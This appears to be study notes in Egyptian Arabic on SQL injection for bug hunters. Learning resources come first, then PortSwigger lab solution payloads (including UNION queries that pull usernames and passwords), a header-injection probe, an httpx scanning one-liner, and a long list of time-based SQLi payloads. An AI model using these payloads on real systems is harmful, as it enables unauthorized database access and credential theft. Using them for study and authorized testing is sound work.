- start
    
    البوست دا مهم جدا جدا للناس بتاعه Bug hunting & peneteration testing  
    النهارده هتكلم علي ثغره sql  
    انا شايفها متواجده ف كل مكان ومينفعش متجربهاش كويس  
    اول حاجه انا كان ف كورس مروفعو علي ميجا كان بيفهمك الQueries  
    وبيفهمك تلاقيها ازايوازاي تعمل Discovering Schema and Extracting Data وحجات تانيه كتير بامانه مفيده اووي بس للاسف هو اتمسح وانا النت عندي خلصان انشاء الله انا هرفعلكو الدنيا دي كلها
    
    تاني حاجه ياسيدي هتبدا تقرا الكتاب دا حرفيا كنز بيفهمك كل حاجه عن السكوال انا بامانه استفدت منه كتيير اووي  
    [http://www.amazon.com/SQL-Injection-Attacks-Defense-Second/dp/1597499633/](http://www.amazon.com/SQL-Injection-Attacks-Defense-Second/dp/1597499633/)
    
    تبدا تحل بعد كدا علي بورت سويجر  
    [https://portswigger.net/web-security/all-labs](https://portswigger.net/web-security/all-labs)  
    كمان متحلش لابات الا ام تكون فاهم فعلا اي هيا السكوال
    
    عندك هنا Blog محترمه  
    بص عليها بصه :  
    [https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
    
    دي برضو شويه لابات حلوه :  
    [https://github.com/Audi-1/sqli-labs](https://github.com/Audi-1/sqli-labs)
    
    عندك برضو مدونه حلوه اووي بتديك كل ميثود بتاع الكويريز هتستفاد منها جامد  
    [https://rails-sqli.org/](https://rails-sqli.org/)
    
    عندك الفيديو دا لtry hack me  
    لو انت مش معاك اك تشترك  
    [https://www.youtube.com/watch?v=VIkVqvo97Hk](https://www.youtube.com/watch?v=VIkVqvo97Hk)
    
    اخيرا وليس باخرا عمك جون حال لاب HTB  
    [https://www.youtube.com/watch?v=SEuyruffJTw](https://www.youtube.com/watch?v=SEuyruffJTw)  
    ربنا يوفقكو يشباب كل اللي محتاجه دعوه من قلبك
    

- [ ] [**SQL injection UNION attack, determining the number of columns returned by the query**](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) `**'+UNION+SELECT+NULL,NULL,NULL--**`
- [ ] [**SQL injection UNION attack, finding a column containing text**](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text) `'+UNION+SELECT+NULL,'hacked',NULL--`
- [ ] [**SQL injection UNION attack, retrieving data from other tables**](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables) `'+UNION+SELECT+username,+password+FROM+users--`
- [ ] [**SQL injection UNION attack, retrieving multiple values in a single column**](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column) `**'+UNION+SELECT+NULL,username||'~'||password+FROM+users--**`
- [ ] [**SQL injection attack, querying the database type and version on Oracle**](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle) `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`
- [ ] [**SQL injection attack, querying the database type and version on MySQL and Microsoft**](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)`'+UNION+SELECT+@@version,+NULL\#--`
- [ ] [**SQL injection attack, listing the database contents on non-Oracle databases**](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
- [ ] `X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z`
- [ ] `cat urls | httpx -silent -path 'sitemap.xml? offset=1%3bSELECT%20IF((8303%3E8302)%2cSLEEP(10)%2c2356)%23' -rt -timeout 20 -mrt '>10’`
- [ ] `admin');SELECT PG_SLEEP(5)--`

- Time Based SQLi Payloads 

```python
sleep(5)#
1 or sleep(5)#
" or sleep(5)#
' or sleep(5)#
" or sleep(5)="
' or sleep(5)='
1) or sleep(5)#
") or sleep(5)="
') or sleep(5)='
1)) or sleep(5)#
")) or sleep(5)="
')) or sleep(5)='
;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
");waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
'));waitfor delay '0:0:5'--
"));waitfor delay '0:0:5'--
benchmark(10000000,MD5(1))#
1 or benchmark(10000000,MD5(1))#
" or benchmark(10000000,MD5(1))#
' or benchmark(10000000,MD5(1))#
1) or benchmark(10000000,MD5(1))#
") or benchmark(10000000,MD5(1))#
') or benchmark(10000000,MD5(1))#
1)) or benchmark(10000000,MD5(1))#
")) or benchmark(10000000,MD5(1))#
')) or benchmark(10000000,MD5(1))#
pg_sleep(5)--
1 or pg_sleep(5)--
" or pg_sleep(5)--
' or pg_sleep(5)--
1) or pg_sleep(5)--
") or pg_sleep(5)--
') or pg_sleep(5)--
1)) or pg_sleep(5)--
")) or pg_sleep(5)--
')) or pg_sleep(5)--
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
SLEEP(5)#
SLEEP(5)--
SLEEP(5)="
SLEEP(5)='
or SLEEP(5)
or SLEEP(5)#
or SLEEP(5)--
or SLEEP(5)="
or SLEEP(5)='
waitfor delay '00:00:05'
waitfor delay '00:00:05'--
waitfor delay '00:00:05'#
benchmark(50000000,MD5(1))
benchmark(50000000,MD5(1))--
benchmark(50000000,MD5(1))#
or benchmark(50000000,MD5(1))
or benchmark(50000000,MD5(1))--
or benchmark(50000000,MD5(1))#
pg_SLEEP(5)
pg_SLEEP(5)--
pg_SLEEP(5)#
or pg_SLEEP(5)
or pg_SLEEP(5)--
or pg_SLEEP(5)#
'\"
AnD SLEEP(5)
AnD SLEEP(5)--
AnD SLEEP(5)#
&&SLEEP(5)
&&SLEEP(5)--
&&SLEEP(5)#
' AnD SLEEP(5) ANd '1
'&&SLEEP(5)&&'1
ORDER BY SLEEP(5)
ORDER BY SLEEP(5)--
ORDER BY SLEEP(5)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
+benchmark(3200,SHA1(1))+'
+ SLEEP(10) + '
RANDOMBLOB(500000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
RANDOMBLOB(1000000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
```